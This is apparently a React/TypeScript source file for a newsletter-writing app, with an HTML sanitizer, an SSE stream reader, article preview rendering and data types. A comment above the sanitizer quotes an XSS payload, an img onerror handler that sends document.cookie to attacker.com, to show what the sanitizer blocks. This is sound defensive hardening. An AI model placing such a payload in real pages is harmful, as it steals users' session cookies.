"use client";

import { type ReactNode } from "react";
import DOMPurify from "isomorphic-dompurify";
import { Badge } from "@/components/ui/badge";
import { type AiActionContext, type VoiceCardSummary } from "@/components/composer";
import { type VoiceCardDoc } from "@/lib/api/content";
import { Image as ImageIcon } from "lucide-react";

const SKILL_LABELS: Record<string, string> = {
  analyse_library: "Analysing content library",
  check_seasonality: "Checking seasonality",
  check_news: "Checking latest news",
  score_idea: "Scoring idea",
  generate_brief: "Generating brief",
  write_newsletter: "Writing newsletter",
  audience_insights: "Getting audience insights",
  extract_content: "Reading article content",
};

export interface StreamProgress { step: number; tools: string[]; label: string }

/**
 * XSS hardening (audit critical #2). Strategist content originates
 * from:
 *  - The AI writer (trusted-ish; output schema constrains tags but
 *    the LLM could theoretically emit `<script>` inside one of the
 *    allowed elements).
 *  - User edits in our textarea (untrusted — anything goes).
 *  - Beehiiv API responses pulled via webhook (untrusted — Beehiiv
 *    could be compromised, or the publication could have malicious
 *    third-party embeds).
 *
 * The Versions tab + WriteTab preview render this content via
 * `dangerouslySetInnerHTML`. Without sanitization, a malicious
 * `<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>`
 * inside any of those sources executes as soon as the user opens
 * the panel. Wrap every untrusted-HTML render through
 * `sanitizeContentHtml` which drops script tags, event handlers,
 * and javascript: URLs while preserving the semantic markup the
 * writers actually emit.
 *
 * Allow-list intentionally tight: same tags + attrs the
 * write-newsletter prompt promises to produce + standard inline
 * formatting + safe links/images. Anything else gets stripped.
 */
export function sanitizeContentHtml(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      "h1", "h2", "h3", "h4", "h5", "h6",
      "p", "br", "hr",
      "ul", "ol", "li",
      "blockquote", "pre", "code",
      "strong", "em", "b", "i", "u", "s", "small", "sub", "sup",
      "a", "img", "figure", "figcaption",
      "table", "thead", "tbody", "tr", "th", "td",
      "div", "span",
    ],
    ALLOWED_ATTR: ["href", "src", "alt", "title", "target", "rel", "class", "data-quote", "data-attributed-to", "data-placeholder", "data-pending", "data-index", "data-disclosure"],
    // Force-strip javascript: URLs and event handlers — the default
    // DOMPurify policy already does this but be explicit.
    ALLOWED_URI_REGEXP: /^(?:https?:|data:image\/|mailto:|tel:|#|\/)/i,
  });
}

/**
 * One inline image slot in the Preview. Shows the resolved image once
 * generated/supplied/uploaded, otherwise a dashed placeholder describing
 * what goes there — so the preview reflects the FULL intended layout (text
 * + images), not text alone.
 */
function PlaceholderPreviewBlock({ p }: { p: ImagePlaceholder }) {
  const resolved =
    !!p.resolvedImageUrl && p.status !== "placeholder" && p.status !== "deleted";

  if (resolved) {
    return (
      <figure className="not-prose my-5">
        {/* eslint-disable-next-line @next/next/no-img-element */}
        <img
          src={p.resolvedImageUrl}
          alt={p.suggestedAltText}
          className="w-full rounded-lg border"
        />
        {p.suggestedCaption && (
          <figcaption className="mt-1.5 text-center text-xs text-muted-foreground">
            {p.suggestedCaption}
          </figcaption>
        )}
      </figure>
    );
  }

  return (
    <div className="not-prose my-5 flex flex-col items-center gap-1.5 rounded-lg border-2 border-dashed border-muted-foreground/25 bg-muted/30 px-4 py-8 text-center">
      <ImageIcon className="size-6 text-muted-foreground/40" />
      <div className="flex items-center gap-1.5">
        <Badge variant="outline" className="text-[10px]">{p.position}</Badge>
        <Badge variant="secondary" className="text-[10px]">{p.dimensions}</Badge>
      </div>
      <p className="max-w-md text-xs font-medium text-foreground">{p.purpose}</p>
      <p className="max-w-md text-[11px] leading-snug text-muted-foreground">{p.description}</p>
    </div>
  );
}

/**
 * Renders the article HTML with image placeholders woven inline at their
 * `position`. The HTML is split on each `<h2>` (section boundary); a
 * `hero` slot renders before the body, `inline-after-section-N` after the
 * Nth section, `pull-quote` after the first section, and `closing` at the
 * end. Any slot whose target section doesn't exist is appended at the end
 * so nothing is silently dropped. With no placeholders this is just the
 * sanitized article.
 */
export function ArticlePreview({ html, placeholders }: { html: string; placeholders: ImagePlaceholder[] }) {
  const live = placeholders.filter((p) => p.status !== "deleted");
  const parts = html.split(/(?=<h2)/i).filter((s) => s.trim().length > 0);
  const hasIntro = parts.length > 0 && !/^\s*<h2/i.test(parts[0]);

  const at = (pos: ImagePlaceholder["position"]) => live.filter((p) => p.position === pos);
  const placed = new Set<ImagePlaceholder>();
  const block = (p: ImagePlaceholder, key: string) => {
    placed.add(p);
    return <PlaceholderPreviewBlock key={key} p={p} />;
  };

  const nodes: ReactNode[] = [];
  at("hero").forEach((p, i) => nodes.push(block(p, `hero-${i}`)));

  parts.forEach((chunk, idx) => {
    nodes.push(
      <div key={`chunk-${idx}`} dangerouslySetInnerHTML={{ __html: sanitizeContentHtml(chunk) }} />,
    );
    const sectionNum = hasIntro ? idx : idx + 1; // part0 = intro(0) when present
    if (sectionNum >= 1) {
      at(`inline-after-section-${sectionNum}` as ImagePlaceholder["position"]).forEach((p, i) =>
        nodes.push(block(p, `s${sectionNum}-${i}`)),
      );
      if (sectionNum === 1) at("pull-quote").forEach((p, i) => nodes.push(block(p, `pq-${i}`)));
    }
  });

  // Closing slot + any placeholders whose target section didn't exist.
  at("closing").forEach((p, i) => nodes.push(block(p, `closing-${i}`)));
  live.filter((p) => !placed.has(p)).forEach((p, i) => nodes.push(<PlaceholderPreviewBlock key={`extra-${i}`} p={p} />));

  return <>{nodes}</>;
}

export async function consumeSSE(
  res: Response,
  onStep: (p: StreamProgress) => void,
): Promise<{ event: string; data: Record<string, unknown> }> {
  const ct = res.headers.get("content-type") || "";
  if (!ct.includes("text/event-stream")) {
    const json = (await res.json().catch(() => null)) as
      | { error?: { message?: string } }
      | null;
    throw new Error(json?.error?.message || "Unexpected response format");
  }

  const reader = res.body?.getReader();
  if (!reader) throw new Error("Streaming not supported");

  const decoder = new TextDecoder();
  let buffer = "";
  let lastEvent: { event: string; data: Record<string, unknown> } | null = null;

  while (true) {
    const { done, value } = await reader.read();
    if (done) break;

    buffer += decoder.decode(value, { stream: true });
    const events = buffer.split("\n\n");
    buffer = events.pop() || "";

    for (const raw of events) {
      const lines = raw.split("\n");
      let eventType = "";
      let data = "";
      for (const line of lines) {
        if (line.startsWith("event:")) eventType = line.slice(6).trim();
        else if (line.startsWith("data:")) data = line.slice(5).trim();
      }
      if (!data) continue;
      try {
        const parsed = JSON.parse(data) as Record<string, unknown>;
        if (eventType === "step") {
          const tools = (parsed.tools as string[] | undefined) || [];
          const toolName = tools[0] || "";
          onStep({ step: parsed.step as number, tools, label: SKILL_LABELS[toolName] || toolName });
        }
        lastEvent = { event: eventType, data: parsed };
      } catch { /* skip malformed */ }
    }
  }

  if (!lastEvent) throw new Error("Stream ended without a result");
  if (lastEvent.event === "error") throw new Error((lastEvent.data.message as string) || "Generation failed");
  return lastEvent;
}

export interface ImagePlaceholder {
  position: "hero" | "inline-after-section-1" | "inline-after-section-2" | "inline-after-section-3" | "pull-quote" | "closing";
  purpose: string;
  description: string;
  suggestedAltText: string;
  suggestedCaption?: string;
  dimensions: "16:9" | "1:1" | "4:5" | "9:16";
  styleHints?: string[];
  status: "placeholder" | "generated" | "uploaded" | "supplied" | "deleted";
  resolvedImageUrl?: string;
  /** cnt_media row backing resolvedImageUrl (set on library-pick / upload). */
  mediaId?: string;
}

export interface IdeaDetail {
  _id: string;
  title: string;
  description?: string;
  status: string;
  starred?: boolean;
  source?: string;
  sector?: string;
  targetAudience?: string;
  contentType?: string;
  contentFormat?: "newsletter" | "article" | "pr" | "advertorial";
  angle?: string;
  aiScore?: number;
  channels?: string[];
  priority?: number;
  targetDate?: string;
  scheduledAt?: string;
  tags?: string[];
  notes?: string;
  brief?: {
    title: string; hook: string; angle: string; targetAudience: string;
    contentType?: string;
    keyDataPoints: (string | { claim: string; source?: string; sourceUrl?: string; confidence: "verified" | "inferred" | "ai_estimated" })[];
    outline: string[];
    estimatedLength: string; toneGuidance: string;
    suggestedPublishDay?: string; whyNow: string; generatedAt: string;
    articleMeta?: {
      metaDescription?: string;
      slug?: string;
      byline?: string;
      seoKeywords?: string[];
    };
    prMeta?: {
      dateline?: string;
      embargoUntil?: string;
      mediaContact?: { name: string; email: string; phone?: string };
      quoteCandidates?: Array<{
        attributedTo: string;
        role: string;
        suggestedQuote?: string;
        status: "suggested" | "confirmed" | "user_provided" | "rejected";
      }>;
    };
    advertorialMeta?: {
      sponsorName?: string;
      sponsorLogoUrl?: string;
      disclosureCopy?: string;
      ctaBlock?: { label: string; url: string; style?: "primary" | "secondary" | "ghost" };
    };
  };
  content?: {
    html: string; subject: string; previewText?: string;
    wordCount: number; version: number; lastEditedAt?: string;
    dataCitations?: { claim: string; source?: string; sourceUrl?: string; confidence: "verified" | "inferred" | "ai_estimated" }[];
    // PR 11 — per-format extras + image placeholders.
    metaDescription?: string;
    slug?: string;
    canonicalUrl?: string;
    byline?: string;
    deck?: string;
    imagePlaceholders?: ImagePlaceholder[];
    writerSkill?: string;
    qualityScore?: number;
    qualityNotes?: string;
    finalAcceptanceRate?: number;
    finalEditCount?: number;
    aiAcceptanceRate?: number;
    textFinalizedAt?: string;
  };
  review?: { submittedAt?: string; verdict?: string; notes?: string };
  publishing?: { beehiivPostId?: string; beehiivUrl?: string; publishedAt?: string };
  createdAt?: string;
  updatedAt?: string;
}

export type Panel = "overview" | "brief" | "write" | "review" | "publish" | "versions";

export const ACTION_LABELS: Record<string, string> = {
  "submit-review": "Submitted for review",
  approve: "Content approved",
  "reject-review": "Revision requested",
  schedule: "Scheduled",
  publish: "Pushed to Beehiiv",
};

/** Map a newsletter voice-card doc to the composer chip summary. */
export function mapNewsletterVoiceCard(cards: VoiceCardDoc[] | undefined): VoiceCardSummary | null {
  if (!cards || cards.length === 0) return null;
  const card = cards[0];
  return {
    id: card._id ?? "newsletter-voice",
    // VoiceCardSummary.channel is a PlatformKey; the newsletter platform
    // key is "beehiiv" (the cnt_voice_cards.channel scope "newsletter" is
    // the query param, not this display key).
    channel: "beehiiv",
    category: card.category,
    toneAdjectives: card.voice?.tone ?? [],
    signaturePhrases: card.voice?.signaturePhrases ?? [],
    avoidPhrases: card.voice?.avoidPhrases ?? [],
    refreshedAt: card.lastGeneratedAt ?? card.updatedAt,
  };
}

/** Success-toast copy per AI op (newsletter-flavoured). */
export function aiOpToast(op: AiActionContext["op"]): string {
  switch (op) {
    case "compose": return "Draft generated.";
    case "redraft": return "Newsletter rewritten.";
    case "shorten": return "Newsletter shortened.";
    case "lengthen": return "Newsletter expanded.";
    case "tone": return "Tone updated.";
    case "quote": return "Quote inserted.";
    case "disclosure": return "Disclosure inserted.";
    default: return "Done.";
  }
}
